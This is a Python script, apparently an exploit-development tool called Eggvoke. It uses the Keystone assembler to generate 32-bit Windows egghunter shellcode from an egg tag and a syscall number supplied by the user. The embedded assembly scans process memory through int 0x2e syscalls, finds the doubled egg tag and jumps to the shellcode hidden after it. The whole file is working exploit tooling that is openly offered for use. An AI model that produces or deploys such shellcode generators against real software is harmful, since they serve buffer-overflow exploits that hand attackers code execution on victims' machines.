from keystone import *
import sys

def reverse(egg):
    egg = egg
    format_egg = egg[::-1]
    return format_egg

def hexify(new):
    new = new
    hex_string = new.encode('ascii').hex()
    return hex_string

def shellcode_gen(hex_egg,sys_call):
    ASM = (		
"							 "
"	loop_inc_page:			 "		
"		or dx, 0x0fff		;"
"	loop_inc_one:			 "	
"		inc edx				;"
"	loop_check:				 "				
"		push edx			;"	
f"   mov eax, {sys_call}	;" 
"   neg eax	;"		
"		int 0x2e			;"	
"		cmp al,05			;"
"		pop edx				;"
"	loop_check_valid:		 "
"		je loop_inc_page	;"
"	is_egg:					 "
f"		mov eax, 0x{hex_egg}	;" 
"		mov edi, edx		;"
"		scasd				;"
"		jnz loop_inc_one	;"
"		scasd				;"
"		jnz loop_inc_one	;"
"	matched:				 "
"		jmp edi				;"
)
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(ASM)
    egghunter = ""
    for dec in encoding:
        egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")
    return "egghunter = (\"" + egghunter + "\")"


banner = '''.------..------..------..------..------..------..------.
|E.--. ||G.--. ||G.--. ||V.--. ||O.--. ||K.--. ||E.--. |
| (\/) || :/\: || :/\: || :(): || :/\: || :/\: || (\/) |
| :\/: || :\/: || :\/: || ()() || :\/: || :\/: || :\/: |
| '--'E|| '--'G|| '--'G|| '--'V|| '--'O|| '--'K|| '--'E|
`------'`------'`------'`------'`------'`------'`------'''

print(banner)
print("-" * 50)
print(' Developed by OracleOfMyst')
print("-" * 50)
print("")

egg = sys.argv[1]
sys_call = sys.argv[2]

if sys_call.startswith('0x'):
    pass
else:
    print('Your syscall does not start with 0x please update')
    exit()

new = reverse(egg)
hex_egg = hexify(new)

print(f'[+] Egg       => {egg}')
print(f'[+] Hex       => 0x{hex_egg}')
print(f'[+] {shellcode_gen(hex_egg,sys_call)}')